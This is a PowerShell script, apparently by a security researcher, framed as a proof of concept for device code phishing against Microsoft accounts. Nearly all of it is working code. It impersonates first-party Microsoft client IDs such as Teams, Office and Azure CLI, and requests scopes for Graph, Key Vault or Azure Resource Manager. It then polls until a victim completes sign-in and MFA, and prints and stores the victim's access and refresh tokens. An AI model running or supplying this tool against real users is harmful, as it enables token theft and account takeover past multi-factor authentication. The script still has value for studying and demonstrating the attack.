
Write-Host -ForeGroundColor Yellow "


               ______  ____   ____ _____ _____     _               ____           _     _                ______  
              / / / / |  _ \ / ___|  ___|_   _|__ | | _____ _ __  / ___|_ __ __ _| |__ | |__   ___ _ __  \ \ \ \ 
             / / / /  | | | | |   | |_    | |/ _ \| |/ / _ \ '_ \| |  _| '__/ _` | '_ \| '_ \ / _ \ '__|  \ \ \ \
             \ \ \ \  | |_| | |___|  _|   | | (_) |   <  __/ | | | |_| | | | (_| | |_) | |_) |  __/ |     / / / /
              \_\_\_\ |____/ \____|_|     |_|\___/|_|\_\___|_| |_|\____|_|  \__,_|_.__/|_.__/ \___|_|    /_/_/_/ 
                                                                                                                 
                                                        Made by:
                                                    Mathias Persson
"
Write-Host -ForeGroundColor Yellow " "                                                                 
Write-Host -ForeGroundColor Yellow " "
Write-Host -ForeGroundColor Yellow " "
Write-Host -ForeGroundColor Yellow "                                                           Skapat av: Mathias Persson                        "
Write-Host -ForeGroundColor Yellow " "
Write-Host -ForeGroundColor Cyan   "    DESCRIPTION: "
Write-Host -ForeGroundColor Cyan   "        This script is created as a Proof of Concept to demonstrate how threat actors could exploit the Device Code Flow to steal tokens."

Write-Host -ForegroundColor Cyan   "`n`n    SYNTAX:"
Write-Host -ForegroundColor White  "    Start-AuthenticationFlow"
Write-Host -ForegroundColor Cyan   "        Initiates an authentication process using the Device Code flow. First, select the client you wish to authenticate for (determines the scope)."
Write-Host -ForegroundColor Cyan   "        Then, select the resource (e.g., Microsoft Graph) that you want to use, this determines what API endpoints are accessible."
Write-Host -ForeGroundColor Cyan   "        A code is generated that the user must enter at Microsoft's login page (https://microsoft.com/devicelogin)."
Write-Host -ForeGroundColor Cyan   "        The user will then be prompted to log in and complete any required MFA (multi-factor authentication)."
Write-Host -ForegroundColor Cyan   "        Upon successful login, the following information is shown in the terminal:"
Write-Host -ForegroundColor Cyan   "        - Access Token"
Write-Host -ForegroundColor Cyan   "        - Refresh Token (if available)"
Write-Host -ForegroundColor Cyan   "        - Tenant ID"
Write-Host -ForegroundColor Cyan   "        - UPN/Username of the logged in user"
Write-Host -ForegroundColor Cyan   "        - Scopes included in the Access Token"
Write-Host -ForegroundColor Cyan   "        - Access Token expiration time"

Write-Host -ForegroundColor Cyan   "`n    REFERENCES:"
Write-Host -ForegroundColor White  "        https://medium.com/@mathias_persson/device-code-phishing-vad-%C3%A4r-det-och-hur-fungerar-det-2ac393bc184f (my blog about the Device Code Flow, in Swedish)"
Write-Host -ForegroundColor White  "        https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code"
Write-Host -ForegroundColor White  "        https://jwt.ms/ (to decode Access Tokens)"
Write-Host (" ")
Write-Host (" ")
Write-Host (" ")


function Show-ClientMenu {
    <#
    .SYNOPSIS
        Displays an interactive menu for selecting a client application.

    .DESCRIPTION
        This function presents the user with a list of available client applications, each associated with a unique number. 
        The user is prompted to enter the corresponding number to select the desired client. The function ensures valid input 
        and returns the selected client as a PowerShell object.

    .PARAMETER clients
        An array of client application objects. Each object must contain at least the properties 'Nr' (a unique number) and 'Name' (a display name).

    .OUTPUTS
        A single object from the input array representing the selected client application.

    .EXAMPLE
        $selectedClient = Show-ClientMenu -clients $clientList

        Prompts the user to choose a client from the $clientList array and stores the selected object in $selectedClient.

    .NOTES
        The function validates user input and repeats the prompt until a valid number corresponding to a listed client is provided.
    
    #>
    
    param([array]$clients)

    Write-Host -ForegroundColor Yellow ("[*] Select a client to authenticate as:")
    $clients | Sort-Object Nr | Format-Table Nr, Name -AutoSize | Out-Host

    $selected_client = $null
    do {
        $choice = Read-Host ("[*] Choose a number for the desired client")
        if ([int]::TryParse($choice, [ref]$null)) {
            $selected_id = [int]$choice
            $selected_client = $clients | Where-Object { $_.Nr -eq $selected_id }
        }
        if (-not $selected_client) {
            Write-Host -ForegroundColor Red ("[-] Invalid selection. Please try again:")
        }
    } while (-not $selected_client)

    return $selected_client
}


function Show-AppMenu {
    <#
    .SYNOPSIS
        Displays an interactive menu for selecting a resource to request access to.

    .DESCRIPTION
        This function presents a list of available resource applications or APIs, each identified by a unique number and name.
        The user is prompted to select one of the resources by entering the corresponding number.
        The function validates the input and returns the selected resource as a PowerShell object.

    .PARAMETER resource
        An array of resource objects. Each object must include at least the properties 'Nr' (a unique number) and 'Name' (a display name).

    .OUTPUTS
        A single object from the input array representing the selected resource.

    .EXAMPLE
        $selectedResource = Show-AppMenu -resource $availableResources

        Prompts the user to choose a resource from the $availableResources array and stores the selected object in $selectedResource.

    .NOTES
        The function ensures the user provides a valid number corresponding to one of the displayed resources.
        It repeats the prompt until a valid selection is made.
    
    #>
    
    param([array]$resource)

    Write-Host -ForegroundColor Yellow ("[*] Select a resource to request access to:")
    $resource | Sort-Object Nr | Format-Table Nr, Name -AutoSize | Out-Host

    $selected_app = $null
    do {
        $scope = Read-Host ("[*] Choose a number for the desired resource")
        if ([int]::TryParse($scope, [ref]$null)) {
            $selected_scope = [int]$scope
            $selected_app = $resource | Where-Object { $_.Nr -eq $selected_scope }
        }
        if (-not $selected_app) {
            Write-Host -ForeGroundColor Red ("[-] Invalid selection. Please try again:")
        }
    } while (-not $selected_app)

    return $selected_app
}


function Request-DeviceCode {
    <#
    .SYNOPSIS
        Initiates the OAuth 2.0 Device Code flow for user authentication.

    .DESCRIPTION
        This function sends a request to the Microsoft identity platform's device code endpoint to begin the Device Code authentication process.
        It constructs the request based on the selected client (which provides the client ID) and the selected application or resource (which defines the scope).
        The resulting response includes a device code, user code, verification URL, and expiration time, among other details.

    .PARAMETER selected_client
        An object representing the client to authenticate as. It must include a 'ClientId' property containing the application's client ID.

    .PARAMETER selected_app
        An object representing the resource or API to access. It must include an 'ApplicationId' property, used to define the scope of the request.

    .OUTPUTS
        A PSCustomObject containing the response from the device code endpoint.
        This typically includes the following fields:
            - device_code
            - user_code
            - verification_uri
            - expires_in
            - interval
            - message

    .EXAMPLE
        $deviceCodeResponse = Request-DeviceCode -selected_client $client -selected_app $resource

        Sends a POST request to the device code endpoint using the specified client and resource.
        The response is stored in $deviceCodeResponse.

    .NOTES
        The scope is constructed as "<ApplicationId>/.default offline_access".
        This function uses the common tenant ("common") to support multi-tenant scenarios.
    
    #>
    
    param($selected_client, $selected_app)

    $deviceCodeEndpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"

    $body = @{
        client_id = $selected_client.ClientId
        scope     = $selected_app.ApplicationId + "/.default offline_access"
    }

    return Invoke-RestMethod -UseBasicParsing -Method Post -Uri $deviceCodeEndpoint -Body $body
}


function Wait-ForToken {
    <#
    .SYNOPSIS
        Polls the token endpoint to retrieve an access token after initiating a Device Code flow.

    .DESCRIPTION
        This function waits for the user to complete authentication using the Device Code flow by repeatedly polling the Microsoft identity platform token endpoint.
        It handles the "authorization_pending" response by continuing to poll at the specified interval until an access token is returned or an unrecoverable error occurs.

    .PARAMETER clientId
        The client ID of the application that is requesting the token. This should match the client ID used when initiating the device code request.

    .PARAMETER deviceCode
        The device code received from the device authorization endpoint. This is used to identify the device flow session during polling.

    .PARAMETER interval
        The number of seconds to wait between polling attempts. This should match the interval returned from the device code response.

    .OUTPUTS
        A PSCustomObject containing the token response upon successful authentication.
        This typically includes:
            - access_token
            - refresh_token
            - expires_in
            - token_type
            - scope

    .EXAMPLE
        $tokenResponse = Wait-ForToken -clientId $client.ClientId -deviceCode $code.device_code -interval $code.interval

        Polls for the access token until it's received or the operation fails.

    .NOTES
        This function specifically handles the "authorization_pending" error to support polling while waiting for user interaction.
        All other errors are treated as terminal and will break the loop.
    
    #>
    
    param(
        [string]$clientId,
        [string]$deviceCode,
        [int]$interval
    )

    $tokenEndpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    $response = $null
    $errorJson = $null

    do {
        Start-Sleep -Seconds $interval
        $body = @{
            client_id   = $clientId
            grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
            device_code = $deviceCode
        }
        try {
            $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $tokenEndpoint -Body $body
        } catch {
            try {
                $errorJson = ($_ | Select-Object -ExpandProperty ErrorDetails).Message | ConvertFrom-Json
                if ($errorJson.error -eq "authorization_pending") {
                    Write-Host -ForegroundColor Yellow $errorJson.error
                }
            } catch {
                $errorJson = @{ error = "unknown_error" }
            }
        }
    } while (-not $response -and $errorJson.error -eq "authorization_pending")

    return $response
}


function Decode-JwtToken {
    <#
    .SYNOPSIS
        Decodes the payload of a JSON Web Token (JWT) and returns it as a PowerShell object.

    .DESCRIPTION
        This function splits a JWT into its component parts, decodes the base64url-encoded payload (the second part),
        and converts it from a JSON string into a PowerShell object for inspection or further processing.

    .PARAMETER Token
        A string representing the full JWT (typically in the format: header.payload.signature).

    .OUTPUTS
        A PSCustomObject representing the decoded JWT payload, which usually includes claims such as:
            - aud (audience)
            - iss (issuer)
            - exp (expiration time)
            - iat (issued at)
            - sub (subject)
            - roles, scopes, etc.

    .EXAMPLE
        $decoded = Decode-JwtToken -Token $access_token

        Returns the payload of the given JWT as a PowerShell object.

    .NOTES
        This function does not validate the signature or verify the authenticity of the token.
        It is intended for local inspection and debugging purposes only.
        Use only with JWTs in the correct format. If the token is malformed or the base64 decoding fails, a warning is shown.
    
    #>
    
    param (
        [string]$Token
        )

    $parts = $Token -split '\.'
    if ($parts.Length -ne 3) {
        Write-Warning -ForeGroundColor Red ("[-] Not a valid JWT token.")
        return
    }

    $payload = $parts[1]
    switch ($payload.Length % 4) {
        2 { $payload += '==' }
        3 { $payload += '='  }
        1 { $payload += '==='}
    }

    $bytes = [System.Convert]::FromBase64String($payload)
    $json = [System.Text.Encoding]::UTF8.GetString($bytes)
    return $json | ConvertFrom-Json
}


function Start-AuthenticationFlow {
    <#
    .SYNOPSIS
        Initiates the OAuth 2.0 Device Code Flow for user authentication against Microsoft services.

    .DESCRIPTION
        This function provides an interactive interface to authenticate a user via the Device Code Flow using a selected public client (application) and a selected resource (API).
        The function guides the user through:
            1. Selecting a client application to authenticate as (e.g. Microsoft Teams, Azure CLI).
            2. Selecting a resource to request access to (e.g. Microsoft Graph, Azure Key Vault).
            3. Receiving a device code and user code with a verification URL to complete authentication.
            4. Polling the token endpoint until authorization is complete.
            5. Displaying and decoding the access token and related information (e.g., Tenant ID, user name, token scopes, and expiry).
            6. Optionally capturing and displaying a refresh token if one is issued.

    .PARAMETER None
        This function does not accept any parameters directly but uses hardcoded client and resource definitions for selection.

    .OUTPUTS
        Displays token details and sets global variables:
            $Global:AccessToken   - Access token string
            $Global:RefreshToken  - (If issued) Refresh token string
            $Global:TenantId      - Directory (tenant) ID from the token
            $Global:ClientId      - Selected client application ID

    .EXAMPLE
        Start-AuthenticationFlow

        Starts an interactive Device Code Flow authentication. The user selects a client and resource, then authenticates in the browser using a device code.
        On success, token data is printed and stored globally for further use.

    .NOTES
        - Uses Microsoft Identity Platform v2 endpoints.
        - Only public clients are supported (no client secrets).
        - Make sure PowerShell is allowed to perform HTTPS requests.
        - Requires network access to Microsoft login and token endpoints.
        - For use in testing, automation, or exploring token contents for debugging or educational purposes.

    .LINK
        https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code
    #>

    $clients = @(
        [PSCustomObject]@{ Nr = 1; Name = "Microsoft Office";                   ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c" }
        [PSCustomObject]@{ Nr = 2; Name = "Microsoft Teams";                    ClientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264" }
        [PSCustomObject]@{ Nr = 3; Name = "Microsoft Outlook";                  ClientId = "5d661950-3475-41cd-a2c3-d671a3162bc1" }
        [PSCustomObject]@{ Nr = 4; Name = "Office 365 SharePoint Online";       ClientId = "00000003-0000-0ff1-ce00-000000000000" }
        [PSCustomObject]@{ Nr = 5; Name = "Azure Portal";                       ClientId = "c44b4083-3bb0-49c1-b47d-974e53cbdf3c" }
        [PSCustomObject]@{ Nr = 6; Name = "Microsoft Azure CLI";                ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" }
        [PSCustomObject]@{ Nr = 7; Name = "Microsoft Azure PowerShell";        ClientId = "1950a258-227b-4e31-a9cf-717495945fc2" }
        [PSCustomObject]@{ Nr = 8; Name = "Microsoft Exchange Web Services";   ClientId = "47629505-c2b6-4a80-adb1-9b3a3d233b7b" }
        [PSCustomObject]@{ Nr = 9; Name = "Microsoft Office 365 Portal";       ClientId = "00000006-0000-0ff1-ce00-000000000000" }
        [PSCustomObject]@{ Nr = 10; Name = "Windows Azure Active Directory";    ClientId = "00000002-0000-0000-c000-000000000000" }
        [PSCustomObject]@{ Nr = 11; Name = "Office Exchange Online";            ClientId = "00000002-0000-0ff1-ce00-000000000000" }
    )

    $resource = @(
        [PSCustomObject]@{ Nr = 1; Name = "Microsoft Graph";                    ApplicationId = "https://graph.microsoft.com"}
        [PSCustomObject]@{ Nr = 2; Name = "Microsoft Office";                   ApplicationId = "https://outlook.office.com"}
        [PSCustomObject]@{ Nr = 3; Name = "Azure Keyvault";                     ApplicationId = "https://vault.azure.net"}
        [PSCustomObject]@{ Nr = 4; Name = "Azure Resource Manager";             ApplicationId = "https://management.azure.com/"}
    )

    $client = Show-ClientMenu -Clients $clients
    Write-Host ("")
    $scope  = Show-AppMenu -Resource $resource

    Write-Host -ForeGroundColor Green ("[+] Initializing the Device Code Flow...")
    $device = Request-DeviceCode -selected_client $client -selected_app $scope

    Write-Host -ForegroundColor Cyan ("`n[*] URL to authenticate:")
    Write-Host -ForegroundColor White $device.verification_uri
    Write-Host -ForegroundColor Cyan ("`n[*] Device Code:")
    Write-Host -ForegroundColor White $device.user_code

    $token = Wait-ForToken -clientId $client.ClientId -deviceCode $device.device_code -interval $device.interval

    if ($token) {
        Write-Host -ForegroundColor Green ("`n[+] Login successful!")
        Write-Host -ForegroundColor Green ("`n[+] Access Token:")
        Write-Host $token.access_token
        
        $decodedToken = Decode-JwtToken -Token $token.access_token

        $Global:AccessToken = $token.access_token
        $Global:TenantId = $decodedToken.tid
        $Global:ClientId = $client.ClientId
        
        if ($token.refresh_token) {
            Write-Host -ForegroundColor Green ("`n[+] Refresh Token:")
            Write-Host $token.refresh_token
            $Global:RefreshToken = $token.refresh_token
        } else {
            Write-Host -ForegroundColor Yellow ("`n[*] No Refresh Token was issued.")
        }

        $decodedToken = Decode-JwtToken -Token $token.access_token

        # Hämta och visa Tenant-ID från Access Token 
        $tenantId = $decodedToken.tid
        Write-Host -ForegroundColor Green ("`n[+] Tenant ID:") 
        Write-Host $tenantId
        $Global:TenantId = $tenantId

        # Hämta UPN (användarnamnet på den som loggat in) från Access Token
        $upn = $decodedToken.upn
        Write-Host -ForegroundColor Green ("`n[+] UserPrincipalName (username) of the authenticated user:")
        Write-Host $upn

        # Hämta scope för Access Token
        $scp = $decodedToken.scp
        Write-Host -ForegroundColor Green ("`n[+] Scopes for Access Token:")
        Write-Host $scp

        # Omvandla giltighetstiden för Access Token till läsbar och lokal tid
        $expiryUnix = $decodedToken.exp
        $expiryTime = [DateTimeOffset]::FromUnixTimeSeconds($expiryUnix).ToLocalTime()
        $issuedUnix = $decoded.iat
        $issuedTime = [DateTimeOffset]::FromUnixTimeSeconds($issuedUnix).ToLocalTime()

        #Write-Host -ForegroundColor Green ("`n[+] Token utfärdades:")
        #Write-Host $issuedTime
        Write-Host -ForegroundColor Green ("`n[+] Token valid until:") 
        Write-Host $expiryTime
        Write-Host (" ")

    } else {
        Write-Host -ForegroundColor Red ("`n[-] Authentication failed: $($errorJson.error)")
    }
}

